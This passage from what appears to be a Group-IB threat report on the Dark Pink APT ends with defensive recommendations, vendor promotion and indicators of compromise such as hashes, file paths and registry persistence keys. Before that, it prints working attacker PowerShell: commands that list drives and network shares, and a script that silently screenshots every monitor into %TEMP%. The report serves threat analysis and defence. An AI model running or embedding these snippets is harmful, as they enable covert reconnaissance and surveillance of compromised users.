2)-and(Test-path\n$($_.deviceid)\\\\)}).deviceid;\n(get-smbshare|?{($_.name -notlike \"*$\")-and($_.name -ne Users)-and($_.path -like\n*:\\\\*)}).path;\n(Get-SMBMapping|?{$_.Status -eq \"OK\"}).remotepath|?{$_ -notlike '*\\\\IPC$'}\n\n```\n**The threat actors can also issue a command to take a screenshot of the desktop of**\n**the compromised device and save these in the %TEMP% directory. They then**\ndownload the images by issuing the below command.\n```\nAdd-type -AssemblyName System.Drawing\nAdd-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.Screen]::AllScreens|%{\n  $bounds =$_.bounds;\n  if($bounds.width -lt 1920){$bounds.width=1920}\n  if($bounds.height -lt 1080){$bounds.height=1080}\n  $image = New-Object Drawing.Bitmap $bounds.width, $bounds.height\n  $graphics = [Drawing.Graphics]::FromImage($image)\n  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty,\n$bounds.size)\n  $screen_file = \"$env:tmp\\\\$($_.DeviceName.replace('\\\\\\\\.\\\\',''))_$((getdate).tostring('yyyyMMddHHmmss')).png\"\n  $image.Save($screen_file)\n  $graphics.Dispose()\n  $image.Dispose()\n  $screen_file\n}\n\n```\n\n-----\n\n## Conclusion\n\nAPT groups come and go, but the preliminary findings of Group-IB’s research into\n**Dark Pink APT demonstrates how threat actors can change course, leverage new**\n**TTPs, and achieve devastating results. The threat actors behind Dark Pink were able,**\nwith the assistance of their custom toolkit, to breach the defenses of governmental and\nmilitary bodies in a range of countries in the APAC and European regions. Dark Pink’s\n**campaign once again underlines the massive dangers that spear-phishing campaigns**\npose for organizations, as even highly advanced threat actors use this vector to gain\naccess to networks, and we recommend that organizations continue to educate their\npersonnel on how to detect these sorts of emails.\n\nAt this stage, Group-IB researchers can confidently say that Dark Pink was behind the\n**successful breaches of at least seven organizations, although we believe that this**\nnumber could be higher. In line with Group-IB’s zero-tolerance policy to cybercrime, our\nanalysts will continue their diligent efforts to uncover Dark Pink’s origin and work to\nuncover more of the unique or peculiar TTPs utilized by this group. We will continue to\nissue proactive notifications to any organization we find to have been breached by this\nparticular threat group.\n\n[In this blog, we attempted to reveal how Group-IB’s proprietary Threat Intelligence](https://www.group-ib.com/products/threat-intelligence/)\nsystem, which detects attacks automatically, can identify the mechanics behind ongoing\nthreat campaigns. Our clients are the first to be informed about Dark Pink, along\n**with other new APT groups that may appear on the horizon, and they are also the**\nfirst to obtain the names of compromised organizations, which helps them avoid supplychain attacks and make their network infrastructure more secure.\n\n## Recommendations\n\nUse modern email protection measures to prevent initial compromise via spear[phishing emails. We recommend Group-IB’s Business Email Protection, which is](https://www.group-ib.com/products/business-email-protection/)\nable to counter these threats effectively.\nOrganizations should ensure they foster a cybersecurity culture in their workplace,\nwhich includes sufficient training to staff on how to identify phishing emails.\nEnsure that your security measures allow for proactive threat hunting that can help\nidentify threats that cannot be detected automatically.\nLimit access to file-sharing resources, with the exception of those used within the\norganization.\nMonitor the creation of LNK files in unusual locations, such as network drives and\nUSB devices.\nEnsure that you observe any use of commands and built-in tools that are frequently\nused for collecting information about the system and files.\n\n\n-----\n\nMaintaining a secure organization requires ongoing vigilance, and using a\n[proprietary solution such as Group-IB Threat Intelligence can help organizations](https://www.group-ib.com/products/threat-intelligence/)\nshore up their security posture by equipping security teams with the latest insights\ninto new and emerging threats.\n\n## Try Group-IB Threat Intelligence now!\n\nOptimize strategic, operational and tactical decision-making with best-in-class cyber\nthreat analytics.\n\n[Request Threat Intelligence Demo right now!](https://www.group-ib.com/products/threat-intelligence/)\n\n### Indicators of compromise\n\n**File indicators:**\n\nCucky: MD5: 926027F0308481610C85F4E3E433573B SHA1:\n24F65E0EE158FC63D98352F9828D014AB239AE16 SHA256:\n9976625B5A3035DC68E878AD5AC3682CCB74EF2007C501C8023291548E11301ACtealer\nLoader:MD5: 728AFA40B20DF6D2540648EF845EB754 SHA1:\nD8DF672ECD9018F3F2D23E5C966535C30A54B71D SHA256:\nC60F778641942B7B0C00F3214211B137B683E8296ABB1905D2557BFB245BF775Packed\nctealer:MD5: 7EAF1B65004421AC07C6BB1A997487B2 SHA1:\n18CA159183C98F52DF45D3E9DB0087E17596A866 SHA256:\nE3181EE97D3FFD31C22C2C303C6E75D0196912083D0C21536E5833EE7D108736MD5:\n732091AD428419247BCE87603EA79F00 SHA1:\n142F909C26BD57969EF93D7942587CDF15910E34 SHA256:\nE45DF7418CA47A9A4C4803697F4B28C618469C6E5A5678213AB81DF9FCC9FD51\n\n**File path:**\n\n$env:tmp\\backuplog $env:tmp\\backuplog1 $env:appdata\\archive.zip\n$env:appdata\\telegram.txt $env:tmp\\afkslfsa.csv $env:tmp\\AB.zip $Env:tmp\\AB\n\n**Scheduled task name:**\n\nMicrosoft Idle\n\n**Mutex:**\n\ngwgXSznM-Jz92k33A-uRcCCksA-9XAU93r5\n\n**Registry path:**\n\nHKCU:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell\nHKCU\\Environment\\OSBuild HKCU\\Environment\\STMP HKCU\\Environment\\SYSPS\nHKCR:\\zolfile\\shell\\open\\command HKCR:\\zolofile\\shell\\open\\command\\zolo\n\n\n-----\n\nHKCU:\\Environment\\guid HKCU:\\Environment\\Update\nHKCU:\\Environment\\UserInitMprLogonScript\nHKCU:\\SOFTWARE\\\\Classes\\\\abcdfile\\shell\\abcd\\ HKCU:\\SOFTWARE\\Classes\\.4ID\\\nHKCU:\\SOFTWARE\\Classes\\.abcd HKCU:\\SOFTWARE\\Classes\\.psr\nHKCU:\\SOFTWARE\\Classes\\.zol HKCU:\\SOFTWARE\\Classes\\.zolo\nHKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command\nHKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command\\\nHKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command\\DelegateExecute\nHKCU:\\SOFTWARE\\Classes\\4IDfile\\shell\\open\\command\\DelegateExecute\\\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\aaaa\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\abcd\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\open\\command\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\open\\command\\abcd\nHKCU:\\SOFTWARE\\Classes\\abcdfile\\shell\\open\\command\\DelegateExecute\nHKCU:\\SOFTWARE\\Classes\\psrfile\\shell\\open\\command\nHKCU:\\SOFTWARE\\Classes\\psrfile\\shell\\open\\command -Name DelegateExecute\nHKCU:\\SOFTWARE\\Classes\\zolfile\\shell\\open\\command\\DelegateExecute\nHKCU:\\SOFTWARE\\Classes\\zolfile\\shell\\open\\command\\zolo\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name DelegateExecute\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name DelegateExecute\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name zolo\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command -Name zolo -Value\nHKCU:\\SOFTWARE\\Classes\\zolofile\\shell\\open\\command\\zolo\nHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Forfiles\nHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Psr\nHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Recents\n\n### APPENDIX A.
